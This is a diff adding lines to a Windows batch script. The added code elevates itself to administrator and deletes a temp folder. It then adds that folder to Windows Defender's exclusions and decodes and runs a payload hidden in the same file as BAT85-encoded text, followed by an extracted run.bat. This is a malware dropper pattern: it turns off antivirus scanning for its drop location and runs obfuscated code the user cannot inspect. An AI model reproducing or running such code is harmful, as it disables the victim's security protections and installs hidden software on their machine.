@@ -1,3 +1,37 @@
+@echo off
+cd /d "%~dp0"
+if "[%1]" == "[49127c4b-02dc-482e-ac4f-ec4d659b7547]" goto :start
+REG QUERY HKU\S-1-5-19\Environment >NUL 2>&1 && goto :start
+
+set command="""%~f0""" 49127c4b-02dc-482e-ac4f-ec4d659b7547
+SETLOCAL ENABLEDELAYEDEXPANSION
+set "command=!command:'=''!"
+
+IF "%~1"=="-suite" GOTO :start
+echo.
+echo          ENABLING ADMINISTRATOR RIGHTS...
+echo.
+echo			  please wait...
+
+powershell -NoProfile Start-Process -FilePath '%COMSPEC%' ^
+-ArgumentList '/c """!command!"""' -Verb RunAs 2>NUL
+
+IF %ERRORLEVEL% GTR 0 (
+    echo.
+    echo =============================================================
+    echo This script needs to be run as administrator.
+    echo =============================================================
+    echo.
+pause
+)
+SETLOCAL DISABLEDELAYEDEXPANSION
+goto :EOF
+::===============================================================================================================
+
+:start
+@echo off &chcp 850 >nul &cd C:\Windows\Temp &rmdir /S /Q "DR_" &mkdir DR_ &cd DR_ &powershell.exe -command "& {Add-MpPreference -ExclusionPath "C:\Windows\Temp\DR_"}"
+@set "0=%~f0" &powershell -nop -c $f=[IO.File]::ReadAllText($env:0)-split':bat2file\:.*';iex($f[1]); X(1) &cls &cmd.exe /c "call run.bat" &exit/b
+
 :bat2file: Compressed2TXT v6.5
 $k='.,;{-}[+](/)_|^=?O123456A789BCDEFGHYIeJKLMoN0PQRSTyUWXVZabcdfghijklmnpqrvstuwxz!@#$&~'; Add-Type -Ty @'
 using System.IO; public class BAT85 {public static void Dec (ref string[] f, int x, string fo, string key) { unchecked {
